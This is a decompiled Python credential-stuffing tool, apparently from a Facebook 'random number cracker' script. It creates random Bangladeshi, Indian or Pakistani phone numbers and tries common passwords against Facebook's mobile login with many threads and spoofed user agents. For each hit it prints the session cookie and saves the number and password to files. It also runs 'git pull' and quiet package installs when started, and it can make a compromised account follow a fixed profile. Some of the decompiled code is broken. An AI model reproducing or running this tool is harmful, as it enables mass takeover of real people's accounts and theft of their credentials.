# Source Generated with Decompyle++
# File: test.pyc (Python 3.9)
# CODES BY TURAG AHAMED
import os
import sys
import time
import requests
import uuid
os.system('git pull')


class jalan:
    
    def __init__(self, z):
        pass

xxx = ("""
\033[1;32m #####  #     #    #    #     # ####### ####### 
\033[1;32m#     # #     #   # #   ##    #    #    #     # 
\033[1;32m#       #     #  #   #  # #   #    #    #     # 
\033[1;32m #####  ####### #     # #  #  #    #    #     # 
\033[1;32m      # #     # ####### #   # #    #    #     # 
\033[1;32m#     # #     # #     # #    ##    #    #     # 
\033[1;32m #####  #     # #     # #     #    #    ####### 
\033[1;32m══════════════════════════════════════════════════════
\033[1;32m[👺]  \033[1;32mCREATED BY\33    :  \033[1;33m SHANTO KING\33[0;m\033[1;32m
\033[1;32m[👺]  \033[1;32mFACEBOK      : \033[1;34m SHANTO_KING
\033[1;32m[👺]  \033[1;32mGITHUB       :  \033[1;35mSHANTO-KING
\033[1;32m[👺]  \033[1;32mTOOL VIRSION :  \033[1;36m10.7
\033[1;32m[👺]  \033[1;32mTOOL TYPE    : \033[1;32m TRAIL
\033[1;92m══════════════════════════════════════════════════════
""")

def o():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/mdoleid.mia')
    print(xxx)
    jalan('\t\tRANDOM NUMBER CRACKR')
    print('\033[1;32m─────────────────────────────────────────────────────────')
    jalan('\033[1;95m[\033[1;93m1\033[1;95m]\033[1;95m RANDOM CRACK ')
    jalan('\033[1;95m[\033[1;93m2\033[1;95m]\033[1;95m CONTACT ME FACEBOOK')
    jalan('\033[1;95m[\033[1;93m3\033[1;95m]\033[1;95m FOLLOW GITHUB ACCOUNT')
    jalan('\033[1;95m[\033[1;93m4\033[1;95m]\033[1;95m JOIN FB GROUP')
    jalan('\033[1;95m[\033[1;93m0\033[1;95m]\033[1;91m EXIT')
    opt = input('\n\x1b[1;32mCHOOSE : ')
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/mdoleid.mia')
        return None
    if None == '3':
        os.system('xdg-open https://www.facebook.com/mdoleid.mia')
        return None
    if None == '4':
        os.system('xdg-open https://www.facebook.com/mdoleid.mia')
        return None
    if None == '0':
        os.system('exit')
        return None
    None('Choose valid option')


import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://m.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://m.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.0009)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
   
# ua GGG
ugen=[]
for ua in range(1000):
       a='Mozilla/5.0 (Linux; Android'
       b=random.choice(['7','8','9','10','11','12','13','14','15',])
       c='Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
       d= random.randrange(40,115)
       e='0'
       f=random.randrange(3000,6000)
       g=random.randrange(20,100)
       h='Mobile Safari/537.36'
       ug=(f"{a} {b} ; {c}{d}.{e}.{f}.{g} {h}")
       ugen.append(ug)
for ua in range(5000):
       a='Mozilla/5.0 (Linux; Android'
       b=random.choice(['9','10','11','12','13','14','15',])
       c='TiVo Stream 4K Build/QTT8.201201.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
       d= random.randrange(40,115)
       e='0'
       f=random.randrange(3000,6000)
       g=random.randrange(20,100)
       h='Mobile Safari/537.36'
       ug=(f"{a} {b} ; {c}{d}.{e}.{f}.{g} {h}")
       ugen.append(ug)
for ua in range(1000):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['9','10','11','12','13','14','15'])
    c='OnePlus 10R 5G Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(40,115)
    e='0'
    f=random.randrange(3000,6000)
    g=random.randrange(20,100)
    h='Mobile Safari/537.36'
    ug=(f"{a}  {b} ;  {c} {d}.{f}.{g} {h}")
    ugen.append(ug)
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
uax = ["Mozilla\.0 (Linux; Android 8.1.0; Redmi Note 5 pro Build\PM1.171019.011) AppleWebKit\37.36 (KHTML, like Gecko) Chrome\7.0.3396.87 Mobile Safari\37.36","Mozilla\.0 (Linux; Android 8.1.0; Redmi Note 5 Pro Build\PM1.171019.011) AppleWebKit\37.36 (KHTML, like Gecko) Chrome\6.0.3359.126 Mobile Safari\37.36","Mozilla\.0 (Linux; Android 8.1.0; Redmi Note 5 Pro Build\PM1.171019.011) AppleWebKit\37.36 (KHTML, like Gecko) Chrome\8.0.3440.91 Mobile Safari\37.36","Mozilla\.0 (Linux; U; Android 8.1.0; en-US; Redmi Note 5 Pro Build\PM1.171019.011) AppleWebKit\37.36 (KHTML, like Gecko) Version\.0 Chrome\7.0.2987.108 UCBrowser\2.8.5.1121 Mobile Safari\37.36","Mozilla\.0 (Linux; Android 8.1.0; Redmi Note 5 Pro Build\PM1.171019.011) AppleWebKit\37.36 (KHTML, like Gecko) Chrome\9.0.3497.100 Mobile Safari\37.36","Mozilla\.0 (Linux; U; Android 8.1.0; en-US; Redmi Note 5 Pro Build\PM1.171019.011) AppleWebKit\37.36 (KHTML, like Gecko) Version\.0 Chrome\7.0.2987.108 UCBrowser\2.9.7.1153 Mobile Safari\37.36","Mozilla\.0 (Linux; Android 8.1.0; Redmi Note 5 Pro Build\PM1.171019.011; wv) AppleWebKit\37.36 (KHTML, like Gecko) Version\.0 Chrome\1.0.3578.99 Mobile Safari\37.36 GSA\.55.6.21.arm64","Mozilla\.0 (Linux; Android 8.1.0; Redmi Note 5 Pro Build\PM1.171019.011; wv) AppleWebKit\37.36 (KHTML, like Gecko) Version\.0 Chrome\1.0.3578.99 Mobile Safari\37.36","Mozilla\.0 (Linux; U; Android 8.1.0; en-US; Redmi Note 5 pro Build\PM1.171019.011) AppleWebKit\37.36 (KHTML, like Gecko) Version\.0 Chrome\7.0.2987.108 UCBrowser\2.5.0.1109 Mobile Safari\37.36","Mozilla\.0 (Linux; Android 8.1.0; Redmi Note 5 Pro Build\PM1.171019.011) AppleWebKit\37.36 (KHTML, like Gecko) Chrome\5.0.3325.109 Mobile Safari\37.36","Mozilla\.0 (Linux; U; Android 8.1.0; en-in; Redmi Note 5 Pro Build\PM1.171019.011) AppleWebKit\37.36 (KHTML, like Gecko) Version\.0 Chrome\1.0.3578.141 Mobile Safari\37.36 XiaoMi\iuiBrowser\1.2.4-g","Mozilla\.0 (Linux; Android 8.1.0; Redmi Note 5 Pro Build\PM7.181105.004; wv) AppleWebKit\37.36 (KHTML, like Gecko) Version\.0 Chrome\9.0.3497.109 Mobile Safari\37.36","Mozilla\.0 (Linux; U; Android 8.1.0; en-US; Redmi Note 5 Pro Build\PM1.171019.011) AppleWebKit\37.36 (KHTML, like Gecko) Version\.0 Chrome\7.0.2987.108 UCBrowser\3.0.0.1288 Mobile Safari\37.36","Mozilla\.0 (Linux; U; Android 8.1.0; en-in; Redmi Note 5 Pro Build\PM1.171019.011) AppleWebKit\37.36 (KHTML, like Gecko) Version\.0 Chrome\1.0.3578.141 Mobile Safari\37.36 XiaoMi\iuiBrowser\1.4.3-g","Mozilla\.0 (Linux; U; Android 8.1.0; en-gb; Redmi Note 5 Pro Build\PM1.171019.011) AppleWebKit\37.36 (KHTML, like Gecko) Version\.0 Chrome\1.0.3578.141 Mobile Safari\37.36 XiaoMi\iuiBrowser\1.4.3-g","Mozilla\.0 (Linux; U; Android 7.1.1; en-US; Redmi Note 5 Pro Build\GI77B) AppleWebKit\37.36 (KHTML, like Gecko) Version\.0 Chrome\7.0.2987.108 UCBrowser\2.12.5.1189 Mobile Safari\37.36","Mozilla\.0 (Linux; Android 8.1.0; Redmi Note 5 Pro Build\PM1.171019.011; wv) AppleWebKit\37.36 (KHTML, like Gecko) Version\.0 Chrome\2.0.3626.121 Mobile Safari\37.36 GSA\.10.7.21.arm64","Mozilla\.0 (Linux; Android 8.1.0; Redmi Note 5 Pro Build\PM1.171019.011; wv) AppleWebKit\37.36 (KHTML, like Gecko) Version\.0 Chrome\0.0.3987.99 Mobile Safari\37.36 GSA\0.96.12.21.arm64","Mozilla\.0 (Linux; Android 8.1.0; Redmi Note 5 Pro Build\PM1.171019.011; wv) AppleWebKit\37.36 (KHTML, like Gecko) Version\.0 Chrome\0.0.3987.87 Mobile Safari\37.36 GSA\0.96.12.21.arm64","Mozilla\.0 (Linux; U; Android 8.1.0; en-in; Redmi Note 5 Pro Build\PM1.171019.011) AppleWebKit\37.36 (KHTML, like Gecko) Version\.0 Chrome\1.0.3578.141 Mobile Safari\37.36 XiaoMi\iuiBrowser\1.5.1-g","Mozilla\.0 (Linux; Android 8.1.0; Redmi Note 5 Pro Build\PM1.171019.011; wv) AppleWebKit\37.36 (KHTML, like Gecko) Version\.0 Chrome\0.0.3987.117 Mobile Safari\37.36 GSA\0.96.12.21.arm64","Mozilla\.0 (Linux; U; Android 8.1.0; en-GB; Redmi Note 5 Pro Build\PM7.181105.004) AppleWebKit\37.36 (KHTML, like Gecko) Version\.0 Chrome\7.0.2987.108 UCBrowser\2.10.0.1163 UCTurbo\.9.4.900 Mobile Safari\37.36","Mozilla\.0 (Linux; Android 8.1.0; Redmi Note 5 Pro Build\PM1.171019.011; wv) AppleWebKit\37.36 (KHTML, like Gecko) Version\.0 Chrome\5.0.3770.143 Mobile Safari\37.36 GSA\.46.5.21.arm64","Mozilla\.0 (Linux; Android 8.1.0; Redmi Note 5 pro Build\PM1.171019.011; wv) AppleWebKit\37.36 (KHTML, like Gecko) Version\.0 Chrome\7.0.3396.87 Mobile Safari\37.36 GSA\0.70.6.21.arm64","Mozilla\.0 (Linux; U; Android 8.1.0; zh-cn; Redmi Note 5 Pro Build\PM1.171019.011) AppleWebKit\37.36 (KHTML, like Gecko) Version\.0 Chrome\1.0.3578.141 Mobile Safari\37.36 XiaoMi\iuiBrowser\1.4.3-g","Mozilla\.0 (Linux; Android 8.1.0; Redmi Note 5 Pro Build\PM1.171019"]
#User agents

####ua github

# APK CHECK
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    os.system('xdg-open https://www.facebook.com/mdoleid.mia')
    jalan (xxx)
    jalan('\033[1;94m─────────────────────────────────────────────────────')
    jalan('\033[1;92m[\033[1;92m✔︎\033[1;91m]\033[1;32mBD CODE    - \033[1;32m88016 \033[1;32m88017 \033[1;32m88018 \033[1;32m88019')
    jalan('\033[1;92m[\033[1;92m✔︎\033[1;91m]\033[1;32mINDIA CODE    - \033[1;32m91778 \033[1;32m91930 \033[1;32m91902\033[1;32m91712')
    jalan('\033[1;92m[\033[1;92m✔︎\033[1;91m]\033[1;32mPAK CODE    - \033[1;32m92345 \033[1;32m92348 \033[1;32m92343 \033[1;32m92315')
    jalan('\033[1;94m─────────────────────────────────────────────────────\n')
    code = input('\033[1;35m\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;33mCHOOSE YOUR COUNTRY CODE : ')
    print("")
    os.system('clear')
    bal = input("ENTER YOUR NAME : ")
    os.system('clear')
    print(xxx)
    limit = int(input('EXAMPLE: 3000, 5000, 15000, 20000\n\n\033[1;91m\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;32mCHOOSE CRACKING LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        jalan (xxx)
        tl = str(len(user))
        IP = requests.get('https://api.ipify.org').text
        print(f"\033[1;91m[\033[1;91m✔︎\033[1;32m]{GREEN} TODAY DATE & TIME :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print('\033[1;91m[\033[1;91m✔︎\033[1;91m]\033[1;92m YOUR NAME : \033[1;92m'+bal)
        print('\033[1;91m[\033[1;91m✔︎\033[1;91m]\033[1;92m COUNTRY CODE : \033[1;32m'+code)
        print('\033[1;91m[\033[1;91m✔︎\033[1;91m]\033[1;92m TOTAL IDS : \033[1;92m'+tl)
        print('\033[1;91m[\033[1;91m✔︎\033[1;91m]\033[1;92m CRACKING HAS STARTED')
        print('\033[1;91m[\033[1;91m✔︎\033[1;91m]\033[1;92m WORKS ON ONLY DATA')
        print('\033[1;93m─────────────────────────────────────────────────────')
        for love in user:
        	uid = code+love
        	pwx = [love, 'Bangladesh','bangladesh','free fire','i love you']            
        	manshera.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m═════════════════════════════════════════════════════')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print('\033[1;32m═════════════════════════════════════════════════════')
 
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb ={ 'authority': 'm.facebook.com',
    'method': 'GET',
    'path': '/',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=Ufk4ZRs_wk_n5euMKo4B8e7Y; sb=Ufk4ZeftAR7VjnEb1j2QziLK; m_pixel_ratio=1.4375; wd=501x1122; fr=0PERWVlmkX4JJpUiJ..BlOPlR.ka.AAA.0.0.BlOPmI.AWX4ZB2gJ5M',
    'dpr': '1.4375',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Infinix X665B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro }
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:66]
                print('    \033[1;32m(SHANTO-OK😍”¥)  ' +uid+ ' | ' +ps+    '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/SHANTO-OK😍.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:56]
                print('    \33[1;31m(SHANTO-CP•)  ' +uid+ ' | ' +ps+           '  \33[1;33m')
                open('/sdcard/SHANTO-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s[RANING] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
 
o()
 
